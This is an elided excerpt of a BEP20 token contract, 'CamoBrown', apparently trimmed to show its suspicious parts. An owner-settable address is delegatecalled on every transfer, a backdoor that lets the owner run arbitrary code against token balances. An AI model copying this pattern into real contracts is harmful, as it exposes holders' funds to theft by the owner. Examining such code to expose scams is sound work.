...
contract CamoBrown is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'CamoBrown';
  ...
  */
  ...
  function claimDividendCAMO(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_CAMO.delegatecall(
  ...
  function SetBonusCAMO(address c) public onlyOwner {
    C_CAMO = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendCAMO(sender, recipient, amount);   
